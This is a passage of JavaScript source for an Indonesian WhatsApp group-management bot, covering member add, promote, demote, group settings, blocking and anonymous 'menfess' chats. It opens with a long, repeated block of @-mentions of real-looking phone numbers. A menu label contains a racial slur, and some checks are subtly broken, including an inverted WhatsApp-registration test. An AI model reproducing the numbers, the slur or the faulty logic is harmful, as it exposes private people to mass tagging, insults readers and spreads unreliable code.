469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩
`, footer, thumb)
break
case 'add': 
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return reply("Masukkan Nomer, Contoh 62xxxxx")
var nyz = phone('+' + q);
if (nyz.isValid == false) return reply("Nomer Yang anda masukkan tidak valid, Lakukan Seperti petunjuk yang di berikan, Contoh 62xxxx")
await rimurubotz.groupParticipantsUpdate(from, [nyz.phoneNumber.split("+")[1] + "@s.whatsapp.net"], "add").catch(e => {only("error", rimurubotz, from)})
break
case 'promote':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (Tag() == "") return reply("tag Orang yang mau anda promote")
rimurubotz.sendMessage(from, {text:`Selamat @${Tag()[0].split("@")[0]} Anda sekarang adalah admin👑`, mentions:[`${Tag()[0].split("@")[0]}@s.whatsapp.net`]},{quoted:nay1}) 
await rimurubotz.groupParticipantsUpdate(from, Tag(), "promote").catch(e => {only("error", rimurubotz, from)})
break
case 'demote':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (Tag() == "") return reply("tag Orang yang mau anda demote")
rimurubotz.sendMessage(from, {text:`Yahhh @${Tag()[0].split("@")[0]} Anda sekarang Bukan admin lagi😪`, mentions:[`${Tag()[0].split("@")[0]}@s.whatsapp.net`]},{quoted:nay1}) 
await rimurubotz.groupParticipantsUpdate(from, Tag(), "demote").catch(e => {only("error", rimurubotz, from)})
break 
case 'setname': case 'setsubject': case 'updatename':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return reply("Masukkan Text")
if (q.length > 25) return reply("Nama terlalu panjang")
await rimurubotz.groupUpdateSubject(from, q)
only("sukses", rimurubotz, from)
break
case 'setdesk': case 'setdeks': case 'updatedesk':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return reply("Masukkan Text")
if (q.length > 500) return reply("Nama terlalu panjang")
await rimurubotz.groupUpdateDescription(from, q)
only("sukses", rimurubotz, from)
break 
case 'tutup': case 'close': case 'closegroup':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.groupSettingUpdate(from, 'announcement')
only("sukses", rimurubotz, from)
break
case 'open': case 'buka': case 'opengroup':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.groupSettingUpdate(from, 'not_announcement')
only("sukses", rimurubotz, from)
break
case 'unlocked': 
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.groupSettingUpdate(from, 'unlocked')
only("sukses", rimurubotz, from)
break
case 'locked': 
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.groupSettingUpdate(from, 'locked')
only("sukses", rimurubotz, from)
break
case 'linkgc': case 'linkgrup': case 'linkgrub': case 'linkgroup': case 'getlink':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
var nyz = await rimurubotz.groupInviteCode(from)
reply("[ *GROUP-CODE(LINK)* ]\nhttps://chat.whatsapp.com/" + nyz)
break
case 'revoke': case 'risetlink': 
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.groupRevokeInvite(from)
only("sukses", rimurubotz, from)
break
case 'welcome':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return rimurubotz.sendMessage(from, {text: "[ *WELCOME* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "WELCOME (AKTIF)", rowId: prefix + command + " aktif"},{title: "WELCOME (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]})
if (q == "aktif") {
if (dataOnly("welcome", "cek", from) == from) return reply("welcome pada group ini telah aktif sebelumnya")
only("sukses", rimurubotz, from)
dataOnly("welcome", "add", from)
} else 
if (q == "nonaktif"){
if (dataOnly("welcome", "cek", from) !== from) return reply("welcome pada group ini telah nonaktif sebelumnya")
only("sukses", rimurubotz, from)
dataOnly("welcome", "remove", from)
} else { rimurubotz.sendMessage(from, {text: "[ *WELCOME* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "WELCOME (AKTIF)", rowId: prefix + command + " aktif"},{title: "WELCOME (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]}) } 
break
case 'antilink':
if (cekUser("id", sender) == null) return sendDaftar(from)
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return rimurubotz.sendMessage(from, {text: "[ *ANTILINK* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "ANTILINK (AKTIF)", rowId: prefix + command + " aktif"},{title: "ANTILINK (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]})
if (q == "aktif") {
if (dataOnly("antilink", "cek", from) == from) return reply("antilink pada group ini telah aktif sebelumnya")
only("sukses", rimurubotz, from)
dataOnly("antilink", "add", from)
} else 
if (q == "nonaktif"){
if (dataOnly("antilink", "cek", from) !== from) return reply("antilink pada group ini telah nonaktif sebelumnya")
only("sukses", rimurubotz, from)
dataOnly("antilink", "remove", from)
} else { rimurubotz.sendMessage(from, {text: "[ *ANTILINK* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "ANTILINK (AKTIF)", rowId: prefix + command + " aktif"},{title: "ANTILINK (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]}) } 
break
case 'setstatus': case 'updatestatus':
if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan text")
if (q.length > 130) return reply("text terlalu panjang")
await rimurubotz.updateProfileStatus(q)
only("sukses", rimurubotz, from)
break
case 'setnamabot': case 'setnamebot': 
if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan text")
if (q.length > 24) return reply("text terlalu panjang")
await rimurubotz.updateProfileName(q)
only("sukses", rimurubotz, from)
break
case 'getpp': 
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
try{ var nyz = await rimurubotz.profilePictureUrl(Tag()[0], 'image') } catch (e) { var nyz = "http://assets.kompasiana.com/items/album/2021/03/24/blank-profile-picture-973460-1280-605aadc08ede4874e1153a12.png" }
rimurubotz.sendMessage(from, {image:{url:nyz}, caption:"xxx", mentions:[sender]},{quoted:nay1})
break
case 'block': case 'ban': case 'banned':
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
await rimurubotz.updateBlockStatus(Tag()[0], "block")
setUser("±ban", `${Tag()[0]}`, true)
only("sukses", rimurubotz, from)
break 
case 'unblock': case 'unban': case 'unbanned':
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
await rimurubotz.updateBlockStatus(Tag()[0], "unblock")
setUser("±ban", `${Tag()[0]}`, false)
only("sukses", rimurubotz, from)
break  
case 'creategroup':
if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan text")
const group = await rimurubotz.groupCreate(q, [owner + "@s.whatsapp.net"])
only("sukses", rimurubotz, from)
rimurubotz.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
break
case 'plusstar':
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
only("sukses", rimurubotz, from)
setUser("+star", `${Tag()[0]}`, 1)
break 
case 'minusstar':
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
only("sukses", rimurubotz, from)
setUser("-star", `${Tag()[0]}`, 1)
break
case 'toimg':
if (isMedia || isQuotedSticker) { 
download("sticker", "toimgg").then(x => { sendMedia("image", "./media/toimgg.webp", "SUKSES") })
} else { reply("Reply Sticker")}
break
case 'script': 
case 'sc':
case 'sourcecode':
rimurubotz.sendMessage(from, {
text: `[ *SOURCE CODE* ]`,
buttonText: "OPEN",
sections:  [{title: "SOURCE CODE", rows: [
{title: "KENAPA?", rowId: ''},
{title: "MAU NYOMOT?", rowId: ''},
{title: "DASAR NIGGA", rowId: ''}]}]
})
break
case 'confes': case 'menfes': case 'confess': case 'menfess':
if (!isPrivate) return rpy(from, 'Private Chat Only!')
if (!q1) return reply(`> Masukkan\n${prefix + command} Nomer\n\n> Contoh?\n${prefix + command} 62xxx`)
var nyz = phone('+' + q1);
if (nyz.isValid == false) return reply("Nomer Yang anda masukkan tidak valid")
var cekon = await rimurubotz.onWhatsApp(nyz)
if (nyz + '@s.whatsapp.net' == sender) return reply('its your self bitch!')
if (!cekon.length == 0) return reply(`Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`)
if (isMenfess) return reply(`Telah Ada Sesi Menfess Sebelumnya ketik delmenfess untuk menghapus`)
reply('Menunggu Konfirmasi Dari Penerima...')
var tgt = q1.replace(/[^@0-9]/g, '')+ "@s.whatsapp.net"
var menfessMessage = {
image : fs.readFileSync('./media/menfess.jpg'),
caption : `hai ${pushname}!, Seseorang Mengajak Mu Chatan Tanpa Identitas, Apakah Kamu Menerimanya?`,
footer : `© XxX - Team`,
buttons: [{ buttonId: '.sure ' + sender, buttonText: { displayText: 'T E R I M A' }, type: 1 }, { buttonId: '.tolak', buttonText: { displayText: 'T O L A K' }, type: 1 }],
headerType: 2,
contextInfo: { 
externalAdReply :{
mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`,
mediaType: 1,
description: 'Join Group Official', 
title: 'ＸｘＸ － Ｔｅａｍｓ Official',
body: footer,
thumbnail: thumb,
renderLargerThumbnail: 1,
sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`
     }}
        }
rimurubotz.sendMessage(tgt, menfessMessage)
break
case 'sure':
if (!isMenfess) 
if (!isTo)
mAdd(q1, sender)
reply("balas delmenfess untuk menghentikan chat!")
only("sukses", rimurubotz, from)
for (let i of menfess) {
            var o = [];
            o.push(i.dari)
rpy(i.dari, "Terhubung\n\n balas delmenfess untuk menghentikan chat!")
}
break
case 'tolak':
dellFess(q1, sender)
only("sukses", rimurubotz, from)
break
case 'dellmenfess':
case 'delmenfess':
case 'dm':
case 'delfess':
if (!isMenfess) return reply("Tidak Ada Sesi Di Akun Anda!")
            if (isTo) {
            for (let i of menfess) {
            var o = [];
            o.push(i.dari)
            let buttons = [
                        { buttonId: '.owner', buttonText: { displayText: 'o w n e r' }, type: 1 },
                        { buttonId: '.menu', buttonText: { displayText: 'M E N U' }, type: 1 },
                    ]
let buttonMessage = {
image: fs.readFileSync('./media/menfess.jpg'),
caption : 'Lawan BicaraMu Telah Menghentikan Menfess',
footer : `© XxX - Team`,
buttons: buttons,
headerType: 2,
contextInfo: { 
externalAdReply :{
mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`,
mediaType: 1,
description: 'Join Group Official', 
title: 'ＸｘＸ － Ｔｅａｍｓ Official',
body: footer,
thumbnail: thumb,
renderLargerThumbnail: 1,
sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`
     }}
        }
rimurubotz.sendMessage(i.dari, buttonMessage)
             var posi = menfess.indexOf(from)
            menfess.splice(posi, 1)
            fs.writeFileSync('./lib/menfess.json', JSON.stringify(menfess, null, 2))
            only("sukses", rimurubotz, from) 
            }
           } else if (isSend) {
            	for (let i of menfess) {
            var o = [];
            o.push(i.kepada)
            let buttons = [
                        { buttonId: '.owner', buttonText: { displayText: 'o w n e r' }, type: 1 },
                        { buttonId: '.menu', buttonText: { displayText: 'M E N U' }, type: 1 },
                    ]
let buttonMessage = {
image: fs.readFileSync('./media/menfess.jpg'),
caption : 'Lawan BicaraMu Telah Menghentikan Menfess',
footer : `© XxX - Team`,
buttons: buttons,
headerType: 2,
contextInfo: { 
externalAdReply :{
mediaUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`,
mediaType: 1,
description: 'Join Group Official', 
title: 'ＸｘＸ － Ｔｅａｍｓ Official',
body: footer,
thumbnail: thumb,
renderLargerThumbnail: 1,
sourceUrl: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`
     }}
        }
rimurubotz.sendMessage(i.kepada, buttonMessage)
            	var posi = menfess.indexOf(from)
            menfess.splice(posi, 1)
            fs.writeFileSync('./lib/menfess.json', JSON.stringify(menfess, null, 2))
            only("sukses", rimurubotz, from)
            }
            } else { return reply("luwh siapa?") }
break
case 'report': case 'bug':

if (!q) return reply("Ada kesalahan/Error Pada fitur? Silahkan masukkan Nama fitur yang bermasalah Kesini\nContoh? #report sticker")
rimurubotz.sendMessage(owner + "@s.whatsapp.net", {text: `[ *NEW-NOTIF* ]\nHalo *${namaowner}*, Ada keluhan untuk kamu, Dari *@${sender.split("@")[0]}*, Katanya *"${q} Tidak bisa digunakan"*, Dia ngirim pesan ini pas jam ${time}`, mentions:[sender]},{quoted:nay1})
reply("Terimakasih telah melaporkan bug/error pada fitur, Jika benar Fitur bermasalah owner akan memperbaiki masalah ini secepatnya, Owner akan mengabaikan jika pesan ini palsu")
break
case 'technology': case 'cuttext': case 'neonlight': case 'thundertext': case 'transformer': case 'sketchtext': case 'lighttext': 
case 'giraffetext':  case 'glasstext': case 'signtext': case 'juicetext': case 'typography': case 'potterytext': case 'comictext': case 'ruststyle': 

if (!q) return reply("Masukkan text")
